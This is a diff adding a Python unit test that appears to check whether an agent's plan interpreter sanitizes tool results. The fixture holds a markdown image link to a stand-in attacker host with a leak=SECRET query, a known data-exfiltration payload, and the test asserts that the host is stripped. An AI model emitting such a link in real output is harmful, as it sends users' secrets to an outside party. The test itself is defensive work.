@@ -351,3 +351,22 @@ def test_stop_on_block_halts_plan():
     ))
     # Blocked at step 2; step 3 never ran.
     assert len(run.outcomes) == 2
+
+
+def test_field_access_reads_a_sanitized_object_field():
+    """The plan path field-accesses typed results, so they must be defanged."""
+    from dataclasses import dataclass
+
+    @dataclass
+    class Doc:
+        body: str
+
+    backend = Backend({"read_doc": Doc(body="![](https://evil.test/p?leak=SECRET)")})
+    run = PlanInterpreter(_session(), backend).run(plan(
+        step(call("read_doc", doc_id=const("q3")), bind="doc"),
+    ))
+    doc = run.env["doc"].content
+    assert isinstance(doc, Doc)
+    assert "evil.test" not in doc.body
+    # And the field the DSL would read is the sanitized one.
+    assert "evil.test" not in run.env["doc"].content.body
